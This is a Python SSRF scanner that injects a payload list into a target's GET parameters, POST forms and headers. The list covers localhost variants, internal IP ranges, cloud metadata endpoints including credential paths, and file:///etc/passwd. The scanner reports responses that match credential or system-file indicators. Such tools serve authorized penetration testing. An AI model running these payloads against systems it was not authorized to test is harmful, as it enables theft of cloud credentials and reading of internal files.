#!/usr/bin/env python3
"""
SSRF (Server-Side Request Forgery) Tester
Tests for SSRF vulnerabilities
"""

import requests
import urllib.parse
import json
import re
from datetime import datetime
from bs4 import BeautifulSoup

class SSRFTester:
    """SSRF vulnerability tester"""

    def __init__(self, target_url, output_file=None):
        self.target_url = target_url
        self.output_file = output_file
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })

        # SSRF payloads targeting internal resources
        self.payloads = [
            # Localhost variations
            'http://localhost',
            'http://127.0.0.1',
            'http://[::1]',
            'http://0.0.0.0',
            'http://127.1',
            'http://127.0.1',
            'http://2130706433',  # Decimal IP for 127.0.0.1

            # Internal IP ranges
            'http://192.168.0.1',
            'http://192.168.1.1',
            'http://10.0.0.1',
            'http://172.16.0.1',
            'http://169.254.169.254',  # AWS metadata

            # Cloud metadata endpoints
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/user-data/',
            'http://metadata.google.internal',
            'http://169.254.169.254/metadata/v1/',

            # DNS rebinding
            'http://localtest.me',
            'http://customer1.app.localhost.my.company.127.0.0.1.nip.io',

            # File protocol
            'file:///etc/passwd',
            'file:///c:/windows/win.ini',

            # Bypass attempts
            'http://127.0.0.1:80',
            'http://127.0.0.1:22',
            'http://127.0.0.1:3306',
            'http://localhost:80',
            'http://[::]:80',
        ]

        # Indicators of SSRF success
        self.success_indicators = [
            # AWS metadata
            r'ami-id',
            r'instance-id',
            r'instance-type',
            r'security-credentials',

            # GCP metadata
            r'kube-env',
            r'attributes/',
            r'project/project-id',

            # Azure metadata
            r'metadata/instance',

            # File access
            r'root:.*:0:0:',
            r'\[extensions\]',  # Windows .ini

            # Common internal services
            r'<title>.*Dashboard',
            r'phpMyAdmin',
            r'RabbitMQ',
            r'Kubernetes',
        ]

    def scan(self):
        """Run SSRF scan"""
        print(f"[*] Starting SSRF scan on {self.target_url}")

        # Test GET parameters
        self._test_get_parameters()

        # Test POST parameters
        self._test_post_parameters()

        # Test headers (Host, Referer, etc.)
        self._test_headers()

        # Save results
        if self.output_file:
            self._save_results()

        return {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities
        }

    def _test_get_parameters(self):
        """Test GET parameters for SSRF"""
        parsed = urllib.parse.urlparse(self.target_url)
        params = urllib.parse.parse_qs(parsed.query)

        if not params:
            # Try common parameter names
            common_params = ['url', 'uri', 'path', 'redirect', 'link', 'src', 'source',
                           'file', 'page', 'callback', 'return', 'data', 'reference']
            params = {p: ['http://example.com'] for p in common_params}

        for param_name in params.keys():
            for payload in self.payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]

                query_string = urllib.parse.urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"

                if self._test_payload(test_url, param_name, payload, 'GET'):
                    break  # Found vulnerability

    def _test_post_parameters(self):
        """Test POST parameters for SSRF"""
        try:
            # Get forms from page
            response = self.session.get(self.target_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')

            if not forms:
                # Try common POST parameters anyway
                common_params = ['url', 'uri', 'path', 'redirect', 'link', 'src']
                for param_name in common_params:
                    for payload in self.payloads:
                        self._test_post_payload(
                            self.target_url,
                            {param_name: payload},
                            param_name,
                            payload
                        )

            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'get').upper()

                if method != 'POST':
                    continue

                action_url = urllib.parse.urljoin(self.target_url, action) if action else self.target_url

                inputs = form.find_all(['input', 'textarea'])
                form_data = {}

                for input_field in inputs:
                    name = input_field.get('name')
                    if name:
                        form_data[name] = 'test'

                # Test each field
                for field_name in form_data.keys():
                    for payload in self.payloads:
                        test_data = form_data.copy()
                        test_data[field_name] = payload

                        if self._test_post_payload(action_url, test_data, field_name, payload):
                            break

        except Exception as e:
            print(f"[!] Error testing POST: {e}")

    def _test_headers(self):
        """Test HTTP headers for SSRF"""
        headers_to_test = ['Referer', 'X-Forwarded-For', 'X-Original-URL', 'X-Rewrite-URL']

        for header in headers_to_test:
            for payload in self.payloads[:10]:  # Test subset for headers
                custom_headers = {header: payload}

                try:
                    response = self.session.get(
                        self.target_url,
                        headers=custom_headers,
                        timeout=10
                    )

                    if self._check_ssrf_indicators(response.text):
                        vuln = {
                            'type': 'SSRF',
                            'severity': 'critical',
                            'url': self.target_url,
                            'parameter': f'Header: {header}',
                            'payload': payload,
                            'evidence': 'SSRF indicators found in response'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] SSRF found via header: {header}")
                        return

                except Exception as e:
                    pass

    def _test_payload(self, url, param_name, payload, method):
        """Test single payload"""
        try:
            response = self.session.get(url, timeout=15, allow_redirects=False)

            # Check for SSRF indicators
            if self._check_ssrf_indicators(response.text):
                vuln = {
                    'type': 'SSRF',
                    'severity': 'critical',
                    'url': url,
                    'parameter': param_name,
                    'payload': payload,
                    'method': method,
                    'evidence': 'SSRF indicators found in response'
                }
                self.vulnerabilities.append(vuln)
                print(f"[!] SSRF found: {param_name} via {method}")
                return True

            # Check for errors that might indicate SSRF attempt
            if self._check_ssrf_errors(response.text):
                vuln = {
                    'type': 'SSRF',
                    'severity': 'medium',
                    'url': url,
                    'parameter': param_name,
                    'payload': payload,
                    'method': method,
                    'evidence': 'SSRF-related error messages detected'
                }
                self.vulnerabilities.append(vuln)
                print(f"[!] Possible SSRF: {param_name} via {method}")
                return True

        except requests.exceptions.Timeout:
            # Timeout might indicate internal network request
            vuln = {
                'type': 'SSRF',
                'severity': 'low',
                'url': url,
                'parameter': param_name,
                'payload': payload,
                'method': method,
                'evidence': 'Request timeout (possible internal network access)'
            }
            self.vulnerabilities.append(vuln)
            print(f"[!] Possible SSRF (timeout): {param_name}")
            return True
        except Exception as e:
            pass

        return False

    def _test_post_payload(self, url, data, field_name, payload):
        """Test POST payload"""
        try:
            response = self.session.post(url, data=data, timeout=15, allow_redirects=False)

            if self._check_ssrf_indicators(response.text):
                vuln = {
                    'type': 'SSRF',
                    'severity': 'critical',
                    'url': url,
                    'parameter': field_name,
                    'payload': payload,
                    'method': 'POST',
                    'evidence': 'SSRF indicators found in response'
                }
                self.vulnerabilities.append(vuln)
                print(f"[!] SSRF found: {field_name} via POST")
                return True

            if self._check_ssrf_errors(response.text):
                vuln = {
                    'type': 'SSRF',
                    'severity': 'medium',
                    'url': url,
                    'parameter': field_name,
                    'payload': payload,
                    'method': 'POST',
                    'evidence': 'SSRF-related error messages detected'
                }
                self.vulnerabilities.append(vuln)
                print(f"[!] Possible SSRF: {field_name} via POST")
                return True

        except Exception as e:
            pass

        return False

    def _check_ssrf_indicators(self, response_text):
        """Check for SSRF success indicators"""
        for indicator in self.success_indicators:
            if re.search(indicator, response_text, re.IGNORECASE):
                return True
        return False

    def _check_ssrf_errors(self, response_text):
        """Check for SSRF-related error messages"""
        error_patterns = [
            r'Connection refused',
            r'Connection timed out',
            r'No route to host',
            r'Network is unreachable',
            r'Could not connect to',
            r'failed to connect',
            r'getaddrinfo failed',
            r'Name or service not known',
        ]

        for pattern in error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False

    def _save_results(self):
        """Save results to file"""
        results = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'total': len(self.vulnerabilities),
                'critical': sum(1 for v in self.vulnerabilities if v['severity'] == 'critical'),
                'high': sum(1 for v in self.vulnerabilities if v['severity'] == 'high'),
                'medium': sum(1 for v in self.vulnerabilities if v['severity'] == 'medium')
            }
        }

        with open(self.output_file, 'w') as f:
            json.dump(results, f, indent=2)


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python3 ssrf_tester.py <url>")
        sys.exit(1)

    tester = SSRFTester(sys.argv[1])
    results = tester.scan()

    print(f"\n[+] Scan complete!")
    print(f"    Vulnerabilities found: {len(results['vulnerabilities'])}")
